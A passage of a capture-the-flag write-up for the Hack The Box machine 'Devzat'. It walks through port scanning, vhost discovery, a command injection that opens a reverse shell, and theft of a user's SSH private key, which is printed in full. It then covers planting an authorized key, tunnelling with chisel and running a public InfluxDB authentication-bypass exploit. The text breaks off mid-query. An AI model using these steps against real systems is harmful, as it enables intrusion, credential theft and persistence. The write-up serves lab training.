# Devzat

# Port Scan

First, we’ve started performing a full port scan.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/Devzat]
└──╼ [★]$ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.10.11.118

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
```

Now, let’s execute a detailed versioned port scan on open ports.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/Devzat]
└──╼ [★]$ sudo nmap -vv -A -sC -Pn -p 22,80,8000 -oA nmap/devzat 10.10.11.118

PORT     STATE SERVICE REASON         VERSION                                                                                                                                                 
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                                                                                            
| ssh-hostkey:                                                                                                                                                                                
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)                                                                                                                                
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNaY36GNxswLsvQjgdNt0oBgiJp/OExsv55LjY72WFW03eiJrOY5hbm5AjjyePPTm2N9HO7uK230THXoGWOXhrlzT3nU/g/DkQyDcFZioiE7M2eRIK2m4egM5SYGcKvXDtQqSK86ex4I31Nq6m9EVp
VWphbLfvaWjRmIgOlURo+P76WgjzZzKws42mag2zIrn5oP+ODhOW/3ta289/EMYS6phUbBd0KJIWm9ciNfKA2D7kklnuUP1ZRBe2DbSvd2HV5spoLQKmtY37JEX7aYdETjDUHvTqgkWsVCZAa5qNswPEV7zFlAJTgtW8tZsjW86Q0H49M5dUPra4BEXfZ0
/idJy+jpMkbfj6+VjlsvaxxvNUEVrbPBXe9SlbeXdrNla5nenpbwtWNhckUlsEZjlpv8VnHqXt99s1mfHJkgO+yF09gvVPVdglDSqMAla8d2rfaVD68RfoGQc10Af6xiohSOA8LIa0f4Yaw+PjLlcylF5APDnSjtQvHm8TnQyRaVM=                
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)                                                                                                                               
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCenH4vaESizD5ZgkV+1Yo3MJH9MfmUdKhvU+2Z2ShSSWjp1AfRmK/U/rYaFOoeKFIjo1P4s8fz3eXr3Pzk/X80=                            
|   256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)                                                                                                                             
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKTxLGFW04ssWG0kheQptJmR5sHKtPI2G+zh4FVF0pBm                                                                                                            
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41                                                                                                                                     
| http-methods:                                                                                                                                                                               
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                  
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                                  
|_http-title: Did not follow redirect to http://devzat.htb/                                                                                                                                   
8000/tcp open  ssh     syn-ack ttl 63 (protocol 2.0)                                                                                                                                          
| ssh-hostkey:                                                                                                                                                                                
|   3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)                                                                                                                                
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTPm8Ze7iuUlabZ99t6SWJTw3spK5GP21qE/f7FOT/P+crNvZQKLuSHughKWgZH7Tku7Nmu/WxhZwVUFDpkiDG1mSPeK6uyGpuTmncComFvD3CaldFrZCNxbQ/BbWeyNVpF9szeVTwfdgY5PNoQFQ0
reSwtenV6atEA5WfrZzhSZXWuWEn+7HB9C6w1aaqikPQDQSxRArcLZY5cgjNy34ZMk7MLaWciK99/xEYuNEAbR1v0/8ItVv5pyD8QMFD+s2NwHk6eJ3hqks2F5VJeqIZL2gXvBmgvQJ8fBLb0pBN6xa1xkOAPpQkrBL0pEEqKFQsdJaIzDpCBGmEL0E/Df
O6Dsyq+dmcFstxwfvNO84OmoD2UArb/PxZPaOowjE47GRHl68cDIi3ULKjKoMg2QD7zrayfc7KXP8qEO0j5Xws0nXMll6VO9Gun6k9yaXkEvrFjfLucqIErd7eLtRvDFwcfw0VdflSdmfEz/NkV8kFpXm7iopTKdcwNcqjNnS1TIs=                
| fingerprint-strings:                                                                                                                                                                        
|   NULL:                                                                                                                                                                                     
|_    SSH-2.0-Go                                                                                                                                                                              
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                  
SF-Port8000-TCP:V=7.92%I=7%D=1/29%Time=61F54403%P=x86_64-pc-linux-gnu%r(NU                                                                                                                    
SF:LL,C,"SSH-2\.0-Go\r\n");                                                                                                                                                                   
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                         
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                                             
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.
17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)                                                                                                              
No exact OS matches for host (test conditions non-ideal).
```

# Enumeration

## HTTP

Accessing the webpage on port 80, we’ve got the following message.

![Untitled](images/Untitled.png)

Let’s write down the `devzat.htb` in our hosts file.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/Devzat]
└──╼ [★]$ sudo echo '10.10.11.118    devzat.htb' |sudo tee /etc/hosts
```

Accessing the page again.

![Untitled](images/Untitled%201.png)

Let’s perform a brute-force directories on the webservice.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/Devzat]
└──╼ [★]$ gobuster-ippsec dir -d -e -u "http://devzat.htb/" -w "/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt" -t 50 -x .txt,.json -o gobuster/devzat_root

http://devzat.htb/images (Status: 301)
http://devzat.htb/assets (Status: 301)
http://devzat.htb/javascript (Status: 301)
http://devzat.htb/README.txt (Status: 200)
http://devzat.htb/server-status (Status: 403)
http://devzat.htb/LICENSE.txt (Status: 200)
```

Now let’s performing a VHOSTs enumeration.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/Devzat]
└──╼ [★]$ gobuster vhost -u "http://devzat.htb/" -w "/opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt" -t 50 -o gobuster/devzat_vhosts | grep "Status: 200"
Found: pets.devzat.htb (Status: 200) [Size: 510]
```

We’ve found a new hostname, let’s write it down in our hosts file.

![Untitled](images/Untitled%202.png)

Accessing it on our browser.

![Untitled](images/Untitled%203.png)

Analyzing the request that add a pet on list using Burpsuite, we’ve got.

![Untitled](images/Untitled%204.png)

After try insert some codes on the JSON fields, we’ve got a request on our netcat listener.

![Untitled](images/Untitled%205.png)

And checking our netcat listener.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/Devzat]
└──╼ [★]$ nc -vnlp 8000
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.10.11.118.
Ncat: Connection from 10.10.11.118:44680.
GET / HTTP/1.1
Host: 10.10.16.31:8000
User-Agent: curl/7.68.0
Accept: */*
```

On bottom of the page, we’ve got instructions on how to get the chat on their app.

![Untitled](images/Untitled%206.png)

So, let’s try it.

## SSH - port 8000

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/Devzat]
└──╼ [★]$ ssh -l jpfdevs devzat.htb -p 8000

The authenticity of host '[devzat.htb]:8000 ([10.10.11.118]:8000)' can't be established.
RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[devzat.htb]:8000,[10.10.11.118]:8000' (RSA) to the list of known hosts.
Welcome to the chat. There are no more users
devbot: jpfdevs has joined the chat
jpfdevs:
```

Grabbing the banner of SSH service, we’ve got using netcat.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/Devzat]
└──╼ [★]$ nc -v devzat.htb 8000
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.11.118:8000.
SSH-2.0-Go
```

Apparently our entry point will be changing the species field on JSON request as we’ve seen on Burpsuite.

# Exploitation

It seems the species field is vulnerable to command injection. Let’s see if we can execute some commands.

![Untitled](images/Untitled%207.png)

Back on our netcat listener.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ sudo nc -vnlp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.118.
Ncat: Connection from 10.10.11.118:43794.
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
patrick@devzat:~/pets$ id
id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)
```

Let’s improve our shell getting the id_rsa private key of the patrick’s user.

```bash
patrick@devzat:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
5yWtXmACNLqer4N9wbbmKvJvack=
-----END OPENSSH PRIVATE KEY-----
```

Now let’s copy it on our attack machine, set up the right permissions and connect on host via SSH.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/patrick]
└──╼ [★]$ ls
id_rsa
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/patrick]
└──╼ [★]$ chmod 600 id_rsa

─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/patrick]
└──╼ [★]$ ssh -i id_rsa patrick@devzat.htb
Enter passphrase for key 'id_rsa':
```

We need the passphrase for the patrick’s private key. Let’s try to crack it using ssh2john tool.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/patrick]
└──╼ [★]$ python2.7 /usr/share/john/ssh2john.py id_rsa > id_rsa_hash
```

Now we have the hash.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/patrick]
└──╼ [★]$ cat id_rsa_hash 
id_rsa:$sshng$2$16$fc712e25bfe5d2d7de92ca5931bd2967$1910$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010fc712e25bfe5d2d7de92ca5931bd2967000000100000000100000197000000077373682d727361000000030100010000018100df53700b6cd0021f4f93a64a7af1a72ccaf95a49fc89073354f372530f0f0014b973808a97071f43328e0cf8f1d46b3e2d93d53e527bd5fd28bb0a0bca7de9d644b794b4997f7a37090fa27aeeb337268185fdeb07270b7827c265ae4618c8ea92c5dc49cdcd2247ec61af12d0a9da0803fe088d4a4fd49bcb69d09af24f61027e618228a9a7cda5721818a045033ce4d305760bb65e3664c134fbae2c83e88fe04fcdc5dc5c3a5561d58346f3c3b0e11f1f7f728cffe86439e1ece6a20d8766ece2adaed8fcb8bbb6af36a066a1f61552c98b0d447882e018d6234fa9d4ccd1b892bf2f2e1e4340cafa9109b2880cd0b61a52820f39186abc95e173c380fb33afad51e4aff418fa7d0c02a91b472b76e3aa95c1e747469d764321d7f930a8be3d45ef22f8cfb9287b0b225de98265c8e33cc0e67d54b797c0f23f6edac0390bf76fb76496750570d9d23135d25a193617575d0ba433dd01197ef088a70d428609f63c2aa85e361f82867a2ce630153214b5ebeaef24b769831ec945e3364d3100000590a5424382507bf231df9e53c70cd0cc94ac9cbaca92b4a8a8c463eea5b51fa828f251a56f7abc5f773eb6887a9dfa119d0ea8b1636c0fbe0cd4e359aa2efb306ba5b7da2df123bbc38552eeda2be39f4b5f202f3254fededba90ac69180eb9d79a537c4f0489e6e5ee2e21b50ec88c637cf0cfd9d7a2d3b240fe5fb8b1f1b61ccbf1a5946eac38705c648102f45ca38b8e0982267f8e8fe898fec71e48fb348e9486e54575e48da66089008c6714be3d08713552495dcd8db93d42dbb973827abf0b764c7484c2e4a5aa808cf400203bcef5b3660396ba723e6f10f0b62fc75d27e829815da858e29fc0f9c34c9a18e4d76059372e48f756daf345635c3c1ca31a0650b3200334edffe23804e86981cfbcfec9ef9ca91c111ae02fccaaf0f571d3226386f70d14230bc9ab2441f8c1116931fddf5231bccbb39d28533c0940865c3f52549dfc6eb3a7379e052c5b7983c17a27b7ad260ae6053c70feedb5a3c73c3ecf8010a180a69812c513f0b2f5cc14e842b5123fec51bf3d504beccee8c9850e2f9f3faee1e256bcbaee338084c6bf0d1e4cc0b7c37ed0901c7cb5b3c0757e83c74e97b098475e05ffb239672ab243d72159eebd0379073dd2f1beb8e990c5f595b02c16ef6696e0113889a9a97db9f48ca70a7cf88a5854b67a89345b1a9cabb1b79e048c4669c42dab6af29b6defcae34d86c218b7e3ba5c2423c6dcc37c8184e4b98d93c88d1975baf1194478cb6c21f9e5f65b81e7d07ecf44f4650f1df7a1621608ff6457090a301ffe1544c526a618f76e9b3687c3efd24c692ffbc4181b3038c88bef77c241ff6709cfed41c939737d7d217fc05082e728ba43be7db8f8d0cd7d79a6ad633d5239d4fbc7c3c0354725722fbd2cb88c4a4cb12745838f7fbfa82c82c577eb0481c785863d5efb59d13c68d3c24df2fb2614345142122cee29fd3bdc83c2a7bc3156fefef4e1a699e74b66db9a8ecddf36a821449fb5b3f6cdfd57c827b035eea138d8cd66f122ba7aa07a692ca34222a0c3da1aeb80eefe8b3de0de20cf5a6a8124fa45c4d0174faf63fd7051f1627110e37716ed7b66fe7d0ca2b10406c0a93891957a17105c8a01d5c4e20cdbcaadb45d2809d203518f87d4eea6ef42856b7ba117ac8af7e2c55958fa4fd9520a5cfb79fe333565afeb4659eb6afe651299e59541b92e1f753228c4c40f28e277b5fcf58235f7d262c804a315735a3f2d55536149a3e238694d44034f516ca582f14ae847f9528c5f7562cd025a5c651320006b5a17deb1b95a6cf416507e59a59e66a985f820384cb0e3572f71fa2ff72b7406b753bab9b1ff62925fdb9fd0c3dfd40200ff244f03fc7e44313b5a50b0a7d575b37c1d2f815358f28089175c271e59ac5040abdc0572d0397a5496c8cd7142bc0c477e83d365f3f1093185903877956b34a87b592dc8bab4af82f65817efd3bea43701da8d01f093ff4ea7868b32aee4970e08470f55fac304380d056f34c276fe9cb5e1ab6379d94bc6509bdf3761341d22dd5059bbc05d1af0f900630c49d66da4a11e01a0611e94c7e1b142a05302007fb6e255f5eb4fcffffe1be2f12dddac12e053cec5c4d734b59c475b9af0d36308ee740aafb15c99f332f740c3f20ffbb6eb6b2d66d9f7b3b191c0ccd80d006635cdf3ec4bf3944676f37db66d30f9b7043d3f97682eddbebb9b7ed727fe39802c812288058f36b1e17fd6e239ded706627b8ca70b01fd23910f7981c32417d1ef14abfee53d903cf8c7d065aa0903ae02f98e231589b858da842ce5abbd743f66ac0b2044d47a938b4bca2617ee9149d9c1904285812ecd8ba9f1b45d95a81a128d9c2d059140d784669cc31e39b6992effb731adc010aef37327b71c8f2d2c8ce7880441b030df804d7949d07d7012d3c4eca3005e6fde1b295e41f7424ff19fdeb4bed61126f710182b04a3650327b9d6412918348f5d993952122a40ce725ad5e600234ba9eaf837dc1b6e62af26f69c9$16$486
```

 Trying to crack it with john, we weren’t successful.

Let’s copy our SSH public key in authorized_keys file.

```bash
patrick@devzat:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDA1x9wN8PmTl+2MkmGsVFR2Zo5lS/DuX5pv46SUM93vDV4VX348OI0eOwF1LgrVmdqaktsbSDtGHMdyeJvQdEKg9gaO3AfnLEsloGrpjQoTNn3lN101I3jD/wN5D3vrkN9lXjAQWxOeVGoj34xwiOBxfjDdNDvjfYjDl/0SeKVProD6B5VWM5D71dfeAS/oJfMxZLcoGpYWggpCyqs0z/jDAQr2fK2OUaFI6IjHfYkqvtubE9GrumbUJn31DFoNUIJpvttQEExqF+Dnka7ruc9cFATf+IItwZ6H7fzi3rSHs2xR6fso6wGTsQQHQ9STYSuVLwRo1Gp4X7DY8paG7UI/GwpOl47d5g5lJX9+ZwzOJYgju1iX6OEglH4N4A1f04bi1TEDlJJAd5C13tKZEdDG79PLB7up3Bj3CKB8tFVdoTT36e/aNvNtPVKZrZFTWSqMr37eBQj2fvOr5bWzugKhmbPOVs5w3f3sJOPR59C5GuiETkDag3NyrEw/sbjLB0=' >> authorized_keys
<JOPR59C5GuiETkDag3NyrEw/sbjLB0=' >> authorized_keys
```

And login to SSH.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ ssh patrick@devzat.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 29 Jan 2022 09:24:10 PM UTC

  System load:  0.0               Processes:                247
  Usage of /:   56.6% of 7.81GB   Users logged in:          0
  Memory usage: 37%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118

107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

patrick@devzat:~$
```

Checking for services running locally, we’ve got.

```bash
patrick@devzat:~$ netstat -nlpt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      889/./petshop       
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      888/./devchat       
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Searching around on the host, we’ve found the directory `/tmp/dev/` where there is a source code which catherine user is the owner.

```bash
patrick@devzat:/tmp/dev$ ls -la
ls -la
total 124
drwxr-xr-x  2 catherine catherine  4096 Jul 16  2021 .
drwxrwxrwt 16 root      root       4096 Jan 30 21:11 ..
-rw-r--r--  1 catherine catherine     3 Jul 16  2021 allusers.json
-rw-r--r--  1 catherine catherine  3235 Jun 22  2021 art.txt
-rw-r--r--  1 catherine catherine  4436 Jun 22  2021 colors.go
-rw-r--r--  1 catherine catherine  1944 Jun 22  2021 commandhandler.go
-rw-r--r--  1 catherine catherine 13827 Jun 22  2021 commands.go
-rw-r--r--  1 catherine catherine 11341 Jul 16  2021 devchat.go
-rw-r--r--  1 catherine catherine   648 Jun 22  2021 eastereggs.go
-rw-r--r--  1 catherine catherine   990 Jun 22  2021 games.go
-rw-r--r--  1 catherine catherine    22 Jun 22  2021 .gitignore
-rw-r--r--  1 catherine catherine  1114 Jun 22  2021 go.mod
-rw-r--r--  1 catherine catherine 13983 Jun 22  2021 go.sum
-rw-r--r--  1 catherine catherine  1067 Jun 22  2021 LICENSE
-rw-r--r--  1 catherine catherine     1 Jul 16  2021 log.txt
-rw-r--r--  1 catherine catherine  5630 Jun 22  2021 README.md
-rwxr-xr-x  1 catherine catherine   123 Jun 22  2021 start.sh
-rw-r--r--  1 catherine catherine   356 Jun 22  2021 testfile.txt
-rw-r--r--  1 catherine catherine  8715 Jun 22  2021 util.go
```

Reading some files, we’ve a chat between Patrick and Catherine where there is a possible location of a password.

![Untitled](images/Untitled%208.png)

Going to the backup folder default, we’ve got.

```bash
patrick@devzat:/var/backups$ ls -la
ls -la
total 140
drwxr-xr-x  2 root      root       4096 Sep 29 16:25 .
drwxr-xr-x 14 root      root       4096 Jun 22  2021 ..
-rw-r--r--  1 root      root      59142 Sep 28 18:45 apt.extended_states.0
-rw-r--r--  1 root      root       6588 Sep 21 20:17 apt.extended_states.1.gz
-rw-r--r--  1 root      root       6602 Jul 16  2021 apt.extended_states.2.gz
-rw-------  1 catherine catherine 28297 Jul 16  2021 devzat-dev.zip
-rw-------  1 catherine catherine 27567 Jul 16  2021 devzat-main.zip
```

Unfortunately, we can’t get or unzip this file. Let’s try now to back to services running locally and check the port 8086.

We ran the chisel as server on our local machine.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/www]
└──╼ [★]$ ./chisel server -p 8000 --reverse
2022/01/30 18:03:52 server: Reverse tunnelling enabled
2022/01/30 18:03:52 server: Fingerprint 6hyTgf0bR7oCY84bsfTQsfUSk66Oy/xz5hbtl30298c=
2022/01/30 18:03:52 server: Listening on http://0.0.0.0:8000
2022/01/30 18:04:00 server: session#1: tun: proxy#R:8008=>8086: Listening
```

And ran the chisel client on victim machine.

```bash
patrick@devzat:/tmp$ ./chisel client 10.10.16.31:8000 R:8008:127.0.0.1:8086
2022/01/30 21:52:39 client: Connecting to ws://10.10.16.31:8000                                
2022/01/30 21:52:43 client: Connected (Latency 183.545786ms)
```

And try to connect on [localhost:8008](http://localhost:8008) with netcat.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ nc -v 127.0.0.1 8008
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:8008.
HEAD / HTTP/1.0

HTTP/1.0 404 Not Found
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
X-Influxdb-Build: OSS
X-Influxdb-Version: 1.7.5
Date: Sun, 30 Jan 2022 21:53:06 GMT
Content-Length: 19
```

We’ve found a service running named Influxdb on version 1.7.5. Let’s search for some public exploit for this version.

We’ve found the following exploit on github.

| EXPLOIT |
| --- |
| https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 |

Running the exploit, we’ve got success.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/catherine/InfluxDB-Exploit-CVE-2019-20933]                                                                        
└──╼ [★]$ python __main__.py                                                                                                                                                                  
  _____        __ _            _____  ____    ______            _       _ _                                                                                                                   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |                                                                                                                  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_                                                                                                                 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|                                                                                                                
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_                                                                                                                 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|                                                                                                                
                                                         | |                                                                                                                                  
                                                         |_|                                                                                                                                  
CVE-2019-20933                                                                                                                                                                                
                                                                                                                                                                                              
Insert ip host (default localhost):                                                                                                                                                           
Insert port (default 8086): 8008                                                                                                                                                              
Insert influxdb user (wordlist path to bruteforce username): ../users.txt                                                                                                                     
                                                                                                                                                                                              
Start username bruteforce                                                                                                                                                                     
[x] patrick                                                                                                                                                                                   
[x] catherine                                  
[v] admin                                      

Host vulnerable !!!                            
Databases list:                                

1) devzat                                      
2) _internal                                   

Insert database name (exit to close): devzat
```

Let’s try to execute some queries.

```bash
[devzat] Insert query (exit to change db): show users
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "user",
                        "admin"
                    ],
                    "values": [
                        [
                            "admin",
                            true
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Measurements of the _internal database.

```bash
[_internal] Insert query (exit to change db): show measurements
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "cq"
                        ],
                        [
                            "database"
                        ],
                        [
                            "httpd"
                        ],
                        [
                            "queryExecutor"
                        ],
                        [
                            "runtime"
                        ],
                        [
                            "shard"
                        ],
                        [
                            "subscriber"
                        ],
                        [
                            "tsm1_cache"
                        ],
                        [
                            "tsm1_engine"
                        ],
                        [
                            "tsm1_filestore"
                        ],
                        [
                            "tsm1_wal"
                        ],
                        [
                            "write"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

After a lot of tries, we’ve got to back to devzat database and execute the following query, literally like this case sensitive.

```bash
